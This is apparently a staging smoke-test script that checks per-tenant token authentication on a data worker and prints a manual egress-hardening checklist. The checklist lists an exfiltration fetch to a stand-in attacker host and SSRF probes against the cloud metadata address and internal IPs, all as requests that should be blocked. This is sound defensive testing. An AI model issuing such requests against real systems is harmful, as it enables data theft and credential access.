#!/usr/bin/env -S deno run --allow-net --allow-env
// Staging smoke for the sandbox-isolation hardening (branch:
// security/sandbox-tenant-isolation). Run AGAINST A DEPLOYED data worker.
//
//   DATA_WORKER_URL=https://ultralight-data.<acct>.workers.dev \
//   WORKER_SECRET=<staging worker secret> \
//   DATA_TENANT_SECRET=<staging tenant secret> \
//   deno run --allow-net --allow-env scripts/smoke/sandbox-isolation-smoke.ts
//
// Self-contained (no repo imports) so it just runs. The mintToken() below is
// byte-identical to api/services/data-tenant-token.ts. Covers the data-worker
// per-tenant proof end-to-end; the egress + raw-connect checks need a published
// net:fetch app — see the MANUAL CHECKLIST printed at the end.

const DATA_WORKER_URL = Deno.env.get("DATA_WORKER_URL");
const WORKER_SECRET = Deno.env.get("WORKER_SECRET");
const DATA_TENANT_SECRET = Deno.env.get("DATA_TENANT_SECRET");

if (!DATA_WORKER_URL || !WORKER_SECRET || !DATA_TENANT_SECRET) {
  console.error("Set DATA_WORKER_URL, WORKER_SECRET, DATA_TENANT_SECRET");
  Deno.exit(2);
}

// Mirrors mintDataTenantToken (api/services/data-tenant-token.ts) exactly:
// gxd1.<base64url(JSON.stringify(claims))>.<hex HMAC-SHA256 over the encoded str>.
async function mintToken(
  appId: string,
  userId: string | null,
  secret: string,
  ttlSeconds = 600,
): Promise<string> {
  const enc = new TextEncoder();
  const nowSec = Math.floor(Date.now() / 1000);
  const claims = { v: 1, appId, userId, iat: nowSec, exp: nowSec + ttlSeconds };
  const bytes = enc.encode(JSON.stringify(claims));
  let binary = "";
  for (const b of bytes) binary += String.fromCharCode(b);
  const encoded = btoa(binary).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
  const key = await crypto.subtle.importKey(
    "raw",
    enc.encode(secret),
    { name: "HMAC", hash: "SHA-256" },
    false,
    ["sign"],
  );
  const sigBuf = await crypto.subtle.sign("HMAC", key, enc.encode(encoded));
  const sig = Array.from(new Uint8Array(sigBuf))
    .map((b) => b.toString(16).padStart(2, "0")).join("");
  return `gxd1.${encoded}.${sig}`;
}

const APP = "app_smoke_" + Math.floor(Date.now() / 1000);
const USER = "user_smoke";

let pass = 0;
let fail = 0;
function check(name: string, ok: boolean, detail = "") {
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${detail ? " — " + detail : ""}`);
  ok ? pass++ : fail++;
}

function dataCall(
  op: string,
  body: Record<string, unknown>,
  headers: Record<string, string>,
): Promise<Response> {
  return fetch(`${DATA_WORKER_URL}/data/${op}`, {
    method: "POST",
    headers: { "Content-Type": "application/json", ...headers },
    body: JSON.stringify(body),
  });
}

const validToken = await mintToken(APP, USER, DATA_TENANT_SECRET);

// 1. Valid worker secret + valid matching tenant token → allowed (200).
{
  const r = await dataCall("load", { appId: APP, userId: USER, key: "smoke" }, {
    "X-Worker-Secret": WORKER_SECRET,
    "X-Tenant-Token": validToken,
  });
  check("valid secret + matching tenant token → 200", r.status === 200, `status ${r.status}`);
}

// 2. Valid token but body points at a DIFFERENT tenant → 403 mismatch.
{
  const r = await dataCall("load", { appId: APP + "_other", userId: USER, key: "x" }, {
    "X-Worker-Secret": WORKER_SECRET,
    "X-Tenant-Token": validToken,
  });
  check("valid token + mismatched body appId → 403", r.status === 403, `status ${r.status}`);
}

// 3. Wrong worker secret → 401 regardless (baseline service auth still holds).
{
  const r = await dataCall("load", { appId: APP, userId: USER, key: "x" }, {
    "X-Worker-Secret": "definitely-wrong",
    "X-Tenant-Token": validToken,
  });
  check("wrong worker secret → 401", r.status === 401, `status ${r.status}`);
}

// 4. No tenant token. OBSERVE (flag off) → 200; ENFORCE (flag on) → 403. Print
//    which mode staging is in so the operator can confirm before/after the flip.
{
  const r = await dataCall("load", { appId: APP, userId: USER, key: "x" }, {
    "X-Worker-Secret": WORKER_SECRET,
  });
  const body = await r.text().catch(() => "");
  if (r.status === 200) {
    check("no token → OBSERVE mode (200)", true, "DATA_TENANT_ENFORCE is OFF");
  } else if (r.status === 403 && body.includes("tenant proof required")) {
    check("no token → ENFORCE mode (403)", true, "DATA_TENANT_ENFORCE is ON");
  } else {
    check("no token → observe(200) or enforce(403)", false, `status ${r.status} ${body}`);
  }
}

console.log(`\n${pass} passed, ${fail} failed`);
console.log(`
MANUAL CHECKLIST — DEFAULT-DENY EGRESS (Phase 2). Need a published net app on
staging that DECLARES network.allowed_destinations: ["example.com"]:
  [ ] declared host: app fetch('https://example.com')   -> 200 (allowed)
  [ ] EXFIL BLOCKED: app fetch('https://attacker.tld/collect') -> 403 egress_blocked
      (undeclared public host — this is the Phase 2 win)
  [ ] app with NO network.allowed_destinations: ANY fetch -> 403 (default-deny)
  [ ] SSRF still blocked: fetch('http://169.254.169.254/latest/meta') -> 403
  [ ] fetch('http://127.0.0.1') / 'http://10.0.0.1'      -> 403
  [ ] declared host that 302 -> 169.254.169.254          -> blocked at the redirect hop
  [ ] declared host that 302 -> an UNDECLARED public host -> blocked at the redirect hop
  [ ] app: import {connect} from 'cloudflare:sockets'    -> fails (no working module)
  [ ] net:connect email agent declaring imap.host:993 + smtp.host:587:
      imapFetchUnseen + smtpSend -> works; a non-declared host:port -> throws
  [ ] AGENT_CALLER_SECRET + DATA_TENANT_SECRET set (non-default) on api + data workers
  [ ] observe logs show zero '/data tenant proof missing/invalid' warns -> set DATA_TENANT_ENFORCE=1
`);
Deno.exit(fail === 0 ? 0 : 1);
